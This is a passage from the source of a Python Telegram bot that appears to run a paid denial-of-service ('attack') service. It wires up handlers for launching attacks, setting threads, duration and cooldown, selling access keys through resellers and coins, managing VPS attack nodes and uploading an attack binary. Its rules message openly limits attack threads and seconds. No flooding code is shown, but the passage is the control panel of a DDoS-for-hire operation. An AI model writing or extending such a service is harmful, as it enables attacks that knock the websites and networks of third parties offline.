        entry_points=[MessageHandler(filters.Regex('^Redeem Key$'), handle_button_click)],
        states={
            GET_KEY: [MessageHandler(filters.TEXT & ~filters.COMMAND, redeem_key)],
        },
        fallbacks=[CommandHandler('cancel', lambda u, c: ConversationHandler.END)]
    )
    
    generate_key_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex('^Generate Key$'), handle_button_click)],
        states={
            GET_DURATION: [MessageHandler(filters.TEXT & ~filters.COMMAND, generate_key)],
        },
        fallbacks=[CommandHandler('cancel', lambda u, c: ConversationHandler.END)]
    )

    generate_special_key_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex('^🔑 Special Key$'), handle_button_click)],
        states={
            GET_SPECIAL_KEY_DURATION: [MessageHandler(filters.TEXT & ~filters.COMMAND, generate_special_key)],
        },
        fallbacks=[CommandHandler('cancel', lambda u, c: ConversationHandler.END)]
    )

    delete_key_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex('^Delete Key$'), handle_button_click)],
        states={
            GET_DELETE_KEY: [MessageHandler(filters.TEXT & ~filters.COMMAND, delete_key)],
        },
        fallbacks=[CommandHandler('cancel', lambda u, c: ConversationHandler.END)]
    )

    set_duration_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex('^Set Duration$'), handle_button_click)],
        states={
            GET_SET_DURATION: [MessageHandler(filters.TEXT & ~filters.COMMAND, set_duration)],
        },
        fallbacks=[CommandHandler('cancel', lambda u, c: ConversationHandler.END)]
    )

    set_threads_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex('^Set Threads$'), handle_button_click)],
        states={
            GET_SET_THREADS: [MessageHandler(filters.TEXT & ~filters.COMMAND, set_threads)],
        },
        fallbacks=[CommandHandler('cancel', lambda u, c: ConversationHandler.END)]
    )

    set_cooldown_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex('^Set Cooldown$'), handle_button_click)],
        states={
            GET_SET_COOLDOWN: [MessageHandler(filters.TEXT & ~filters.COMMAND, set_cooldown)],
        },
        fallbacks=[CommandHandler('cancel', lambda u, c: ConversationHandler.END)]
    )

    add_reseller_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex('^Add Reseller$'), handle_button_click)],
        states={
            GET_RESELLER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_reseller)],
        },
        fallbacks=[CommandHandler('cancel', lambda u, c: ConversationHandler.END)]
    )

    remove_reseller_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex('^Remove Reseller$'), handle_button_click)],
        states={
            GET_REMOVE_RESELLER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, remove_reseller)],
        },
        fallbacks=[CommandHandler('cancel', lambda u, c: ConversationHandler.END)]
    )

    add_coin_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex('^Add Coin$'), handle_button_click)],
        states={
            GET_ADD_COIN_USER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_coin_user_id)],
            GET_ADD_COIN_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_coin_amount)],
        },
        fallbacks=[CommandHandler('cancel', lambda u, c: ConversationHandler.END)]
    )

    add_group_id_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex('^Add Group ID$'), handle_button_click)],
        states={
            ADD_GROUP_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_group_id)],
        },
        fallbacks=[CommandHandler('cancel', lambda u, c: ConversationHandler.END)]
    )

    remove_group_id_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex('^Remove Group ID$'), handle_button_click)],
        states={
            REMOVE_GROUP_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, remove_group_id)],
        },
        fallbacks=[CommandHandler('cancel', lambda u, c: ConversationHandler.END)]
    )

    add_vps_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex('^Add VPS$'), handle_button_click)],
        states={
            GET_VPS_INFO: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_vps)],
        },
        fallbacks=[CommandHandler('cancel', lambda u, c: ConversationHandler.END)]
    )

    remove_vps_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex('^Remove VPS$'), handle_button_click)],
        states={
            GET_VPS_TO_REMOVE: [MessageHandler(filters.TEXT & ~filters.COMMAND, remove_vps)],
        },
        fallbacks=[CommandHandler('cancel', lambda u, c: ConversationHandler.END)]
    )

    upload_binary_handler_conv = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex('^Upload Binary$'), handle_button_click)],
        states={
            CONFIRM_BINARY_UPLOAD: [
                MessageHandler(filters.Document.ALL | filters.TEXT, upload_binary_handler)
            ],
        },
        fallbacks=[CommandHandler('cancel', lambda u, c: ConversationHandler.END)]
    )
    
    delete_binary_handler_conv = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex('^Delete Binary$'), handle_button_click)],
        states={
            CONFIRM_BINARY_DELETE: [
                CallbackQueryHandler(delete_binary_handler)
            ],
        },
        fallbacks=[CommandHandler('cancel', lambda u, c: ConversationHandler.END)]
    )

    add_co_owner_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex('^Add Co-Owner$'), handle_button_click)],
        states={
            GET_ADD_CO_OWNER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_co_owner)],
        },
        fallbacks=[CommandHandler('cancel', lambda u, c: ConversationHandler.END)]
    )

    remove_co_owner_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex('^Remove Co-Owner$'), handle_button_click)],
        states={
            GET_REMOVE_CO_OWNER_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, remove_co_owner)],
        },
        fallbacks=[CommandHandler('cancel', lambda u, c: ConversationHandler.END)]
    )

    set_display_name_handler_conv = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex('^Set Display Name$'), handle_button_click)],
        states={
            GET_DISPLAY_NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, set_display_name_handler)],
        },
        fallbacks=[CommandHandler('cancel', lambda u, c: ConversationHandler.END)]
    )

    add_bot_instance_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex('^Add Bot$'), handle_button_click)],
        states={
            GET_BOT_TOKEN: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_bot_token)],
            GET_OWNER_USERNAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, add_owner_username)],
        },
        fallbacks=[CommandHandler('cancel', lambda u, c: ConversationHandler.END)]
    )

    remove_bot_instance_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex('^Remove Bot$'), handle_button_click)],
        states={
            SELECT_BOT_TO_STOP: [MessageHandler(filters.TEXT & ~filters.COMMAND, remove_bot_instance)],
        },
        fallbacks=[CommandHandler('cancel', lambda u, c: ConversationHandler.END)]
    )

    start_bot_instance_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex('^Start Selected Bot$'), handle_button_click)],
        states={
            SELECT_BOT_TO_START: [MessageHandler(filters.TEXT & ~filters.COMMAND, start_bot_instance)],
        },
        fallbacks=[CommandHandler('cancel', lambda u, c: ConversationHandler.END)]
    )

    stop_bot_instance_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex('^Stop Selected Bot$'), handle_button_click)],
        states={
            SELECT_BOT_TO_STOP: [MessageHandler(filters.TEXT & ~filters.COMMAND, stop_bot_instance)],
        },
        fallbacks=[CommandHandler('cancel', lambda u, c: ConversationHandler.END)]
    )

    manage_links_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex('^🔗 Manage Links$'), handle_button_click)],
        states={
            GET_LINK_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_link_number)],
            GET_LINK_URL: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_link_url)],
        },
        fallbacks=[CommandHandler('cancel', lambda u, c: ConversationHandler.END)]
    )

    set_vps_count_handler = ConversationHandler(
        entry_points=[CommandHandler("setvps", set_vps_count)],
        states={
            GET_VPS_COUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, set_vps_count_input)],
        },
        fallbacks=[CommandHandler('cancel', lambda u, c: ConversationHandler.END)]
    )

    set_image_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex('^Change Image$'), handle_button_click)],
        states={
            GET_NEW_IMAGE_URL: [MessageHandler(filters.TEXT & ~filters.COMMAND, set_new_image_url)],
        },
        fallbacks=[CommandHandler('cancel', lambda u, c: ConversationHandler.END)]
    )

    set_group_name_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex('^Change Group Name$'), handle_button_click)],
        states={
            GET_NEW_GROUP_NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, set_new_group_name)],
        },
        fallbacks=[CommandHandler('cancel', lambda u, c: ConversationHandler.END)]
    )

    broadcast_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex('^📢 Broadcast$'), handle_button_click), CommandHandler("broadcast", broadcast_start)],
        states={
            GET_BROADCAST_MESSAGE: [MessageHandler(filters.ALL & ~filters.COMMAND, broadcast_message)],
        },
        fallbacks=[CommandHandler('cancel', lambda u, c: ConversationHandler.END)]
    )

    set_group_image_conv = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex('^🖼️ Set Group Image$'), handle_button_click), CommandHandler("set_group_image", set_group_image_prompt)],
        states={
            GET_NEW_IMAGE_URL: [MessageHandler(filters.TEXT | filters.PHOTO, set_group_image_handler)],
        },
        fallbacks=[CommandHandler('cancel', lambda u, c: ConversationHandler.END)]
    )

    set_group_link_conv = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex('^🔗 Set Group Link$'), handle_button_click), CommandHandler("set_group_link", set_group_link_prompt)],
        states={
            GET_GROUP_LINK: [MessageHandler(filters.TEXT, set_group_link_handler)],
        },
        fallbacks=[CommandHandler('cancel', lambda u, c: ConversationHandler.END)]
    )

    # Add handlers to the application
    application.add_handler(attack_handler)
    application.add_handler(redeem_handler)
    application.add_handler(generate_key_handler)
    application.add_handler(generate_special_key_handler)
    application.add_handler(delete_key_handler)
    application.add_handler(set_duration_handler)
    application.add_handler(set_threads_handler)
    application.add_handler(set_cooldown_handler)
    application.add_handler(add_reseller_handler)
    application.add_handler(remove_reseller_handler)
    application.add_handler(add_coin_handler)
    application.add_handler(add_group_id_handler)
    application.add_handler(remove_group_id_handler)
    application.add_handler(add_vps_handler)
    application.add_handler(remove_vps_handler)
    application.add_handler(upload_binary_handler_conv)
    application.add_handler(delete_binary_handler_conv)
    application.add_handler(add_co_owner_handler)
    application.add_handler(remove_co_owner_handler)
    application.add_handler(set_display_name_handler_conv)
    application.add_handler(add_bot_instance_handler)
    application.add_handler(remove_bot_instance_handler)
    application.add_handler(start_bot_instance_handler)
    application.add_handler(stop_bot_instance_handler)
    application.add_handler(manage_links_handler)
    application.add_handler(set_vps_count_handler)
    application.add_handler(set_image_handler)
    application.add_handler(set_group_name_handler)
    application.add_handler(broadcast_handler)
    application.add_handler(set_group_image_conv)
    application.add_handler(set_group_link_conv)

    # Callback handler for redeem overwrite confirmation
    application.add_handler(CallbackQueryHandler(redeem_key_callback, pattern=r'redeem_overwrite.*|redeem_cancel'))

    # Other command and message handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("status", show_status))
    application.add_handler(CommandHandler("uptime", lambda u, c: u.message.reply_text(f"✅ Bot Uptime: *{get_uptime()}*", parse_mode='Markdown')))
    application.add_handler(CommandHandler("balance", show_balance))
    application.add_handler(CommandHandler("openbot", open_bot))
    application.add_handler(CommandHandler("closebot", close_bot))
    application.add_handler(CommandHandler("menu", menu_selection))
    application.add_handler(CommandHandler("restatus", show_reseller_status))
    application.add_handler(CommandHandler("vpsstatus", show_vps_status))
    application.add_handler(CommandHandler("rules", lambda u, c: u.message.reply_text(
        "📜 *Bot Rules:*\n1. Do not attack government or critical infrastructure websites.\n2. Do not misuse the bot.\n3. Respect other users.\n4. All attacks are logged. Misuse will result in key revocation.\n5. The bot owner is not responsible for your actions.\n6. Max 900 threads for general keys, max 2000 for special keys.\n7. Max 600 seconds duration for general keys, max 240 seconds for special keys.\n8. Cooldown of 60 seconds between attacks for regular users.",
        parse_mode='Markdown'
    )))
    application.add_handler(CommandHandler("settings", settings_menu))
    application.add_handler(CommandHandler("ownersettings", owner_settings))
    application.add_handler(CommandHandler("checkusers", show_users))
    application.add_handler(CommandHandler("promote", promote))
    application.add_handler(CommandHandler("resetvps", reset_vps))
    application.add_handler(CommandHandler("running", show_running_attacks)) # New command to show running attacks

    # Generic message handler for buttons and tracking
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_button_click))
    # Handler for general photo messages (can be used for image configuration if no conversation is active)
    application.add_handler(MessageHandler(filters.PHOTO, set_group_image_handler))

    # Handler to track all chats (private, group, supergroup) for broadcasting
    application.add_handler(MessageHandler(filters.ALL & filters.ChatType.PRIVATE, track_new_chat))
    application.add_handler(MessageHandler(filters.ALL & (filters.ChatType.GROUP | filters.ChatType.SUPERGROUP), track_new_chat))
    
    # Track when the bot leaves or is kicked from a chat
    application.add_handler(ChatMemberHandler(track_left_chat, ChatMemberHandler.MY_CHAT_MEMBER))


    # Add job queue to check expired keys periodically (e.g., every hour)
    job_queue = application.job_queue
    job_queue.run_repeating(check_expired_keys, interval=3600, first=10)
    # Add periodic data sync (e.g., every 5 minutes)
    job_queue.run_repeating(periodic_sync, interval=300, first=30) # Sync every 5 minutes

    logging.info("Bot starting polling...")
    application.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == '__main__':
    main()